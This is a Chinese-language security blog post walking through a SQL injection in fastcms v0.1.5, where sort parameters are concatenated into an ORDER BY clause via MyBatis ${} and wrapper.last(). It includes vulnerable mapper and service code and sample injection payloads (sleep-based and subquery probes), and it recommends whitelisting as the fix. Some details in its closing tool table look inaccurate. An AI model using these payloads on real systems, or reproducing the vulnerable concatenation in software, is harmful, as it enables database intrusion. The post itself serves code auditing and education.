---
title: MyBatis框架SQL注入漏洞深度剖析
url: https://mp.weixin.qq.com/s/3Dm6vTqVd_cV34sfxNzxxQ
source: Doonsec's feed
date: 2026-04-13
fetch_date: 2026-04-14T04:42:40.503298
---

# MyBatis框架SQL注入漏洞深度剖析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/dscLuiaicVquN7bB99sjTW34UiaRsdAm6nWyS2NbFNUNibTtvaoZjY34Hh8sibpOTLDsEicwbmF8aVjLwUcPkVibFq16PYl8gJpkjzjBo8UVRa2r7k/0?wx_fmt=jpeg)

# MyBatis框架SQL注入漏洞深度剖析

船山信安

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# MyBatis框架SQL注入漏洞深度剖析：从原理到实战

## 前言

最近在审计一个CMS系统时，遇到了一个典型的MyBatis注入问题，整理一下分享出来。这个漏洞出在fastcms v0.1.5的后台功能中，问题点很经典，值得拿出来说道说道。

## 知识点梳理

### 1. MyBatis

MyBatis这玩意儿，说白了就是帮你少写JDBC代码的封装层。它支持XML和注解两种方式配置SQL语句，最后把执行结果映射成Java对象。用过的人都知道，配置文件一般扔在resources目录下。

重点来了：**每个mapper都有namespace属性**，用来防止多个mapper冲突，而且这玩意儿不能重复。id是查询方法的唯一标识，resultType指定返回值类型。

![](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquPaYIpVBj0xXaLjEPibib5R4RPJZicAJicEZ30XS5xb2wBKTk8w85WQ8EUeibu1iapIyKDXjNqhK2QNia77QcOpria3icq0HFGy2cM7iammg/640?wx_fmt=png&from=appmsg)

### 2. #{} 和 ${} 的区别——这是核心

这两个符号决定了SQL拼接方式：

```
// #{} 预编译处理，参数化查询，安全
SELECT * FROM user WHERE id = #{userId}

// ${} 直接字符串替换，危险！
SELECT * FROM user ORDER BY ${columnName}
```

`#{}`会被MyBatis预编译成参数化语句，参数会被当作值处理，不会拼接进SQL语句。而`${}`是直接字符串替换，你传啥它就往SQL里填啥。

**为什么order by必须用${}？**

因为order by后面跟的是列名，不是值。你试试`ORDER BY #{column}`，MyBatis会给你包上引号，变成`ORDER BY 'id'`，直接报语法错误。开发者为了省事，直接用`${}`拼接，这口子就这么开了。

### 3. 代码审计思路

审计MyBatis注入的标准操作：

```
1. 全局搜索 ${ 在XML文件里
2. 找到对应的Mapper接口
3. 追踪调用链，看参数是否可控
4. 寻找API路径，构建测试Payload
```

就这么几步，简单粗暴但有效。

## 漏洞复现过程

### 第一步：定位问题点

在ArticleCommentMapper.xml里发现了这个：

```
<select id="pageArticleComment" resultType="xxx">
    SELECT * FROM article_comment
    ORDER BY ${sortField} ${sortOrder}
</select>
```

sortField和sortOrder两个参数直接拼接进SQL，完全没有过滤。

### 第二步：追踪调用链

先看ArticleController里的调用：

```
@GetMapping("/comment/page")
public Result<IPage<ArticleComment>> page(
    @RequestParam(defaultValue = "1") Integer current,
    @RequestParam(defaultValue = "10") Integer size,
    @RequestParam(required = false) String sortField,
    @RequestParam(required = false) String sortOrder) {

    // 使用QueryWrapper构建，安全
    QueryWrapper<ArticleComment> wrapper = new QueryWrapper<>();
    wrapper.orderBy(true, true, sortField);
    return Result.success(commentService.page(new Page<>(current, size), wrapper));
}
```

第一处调用用了QueryWrapper，没问题。继续往下追。

### 第三步：找到真正的问题

在另一个Service方法里：

```
public IPage<ArticleComment> pageArticleComment(Integer current, Integer size,
    String sortField, String sortOrder) {

    IPage<ArticleComment> page = new Page<>(current, size);
    LambdaQueryWrapper<ArticleComment> wrapper = new LambdaQueryWrapper<>();

    // 这里是关键——直接拼进XML里的${}
    wrapper.last("ORDER BY " + sortField + " " + sortOrder);

    return this.page(page, wrapper);
}
```

参数直接传进去了，完美。

### 第四步：构造Payload

```
# 正常的排序
sortField=create_time&sortOrder=desc

# 注入测试——利用sleep延时判断
sortField=IF(1=1,sleep(3),create_time)&sortOrder=desc

# 更狠的，直接union注入
sortField=id AND (SELECT COUNT(*) FROM admin)>0&sortOrder=desc
```

![](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquMbaQTDX9DkGwHxbnVZH5nOdfUPJtsODaDXvqv2E1ZmqNmtQuOria0sUGhJt5S73T34HFA4dATEw3Hic3hAGJbEn8a23r6uejVs4/640?wx_fmt=png&from=appmsg)

##

## 总结

这个漏洞的根因很明确：**开发者在order by场景下为了省事，直接用${}拼接用户输入**。正确的做法是维护一个白名单字段列表，只允许预定义的字段进行排序。

---

## 附：5个AI逆向工具推荐

审计过程中我也试了试AI辅助工具，说几个实际用过的：

| 工具 | 特点 | 适用场景 |
| --- | --- | --- |
| **Semgrep** | 静态分析神器，支持自定义规则 | 批量扫MyBatis配置文件 |
| **CodeQL** | GitHub亲儿子，查询语言强大 | 复杂代码逻辑分析 |
| **SonarQube** | 集成度高，支持多语言 | 项目整体安全评估 |
| **Sematic** | 新出的AI驱动代码审查 | 快速定位可疑代码片段 |
| **DeepCode** | 字节系产品，AI学习能力强 | 代码漏洞预测 |

---

参考博客链接: https://www.cnblogs.com/wanganzgj/p/19642586

*本文仅供学习交流，请勿用于非法用途。*

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP80khZp3raYsnCBL854MQ5ouD4zwyygRyXGlvOFEsx69v1ml1s65gia6wwql6v17n12j2CXZibO0ZA/0?wx_fmt=png)

船山信安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP80khZp3raYsnCBL854MQ5ouD4zwyygRyXGlvOFEsx69v1ml1s65gia6wwql6v17n12j2CXZibO0ZA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过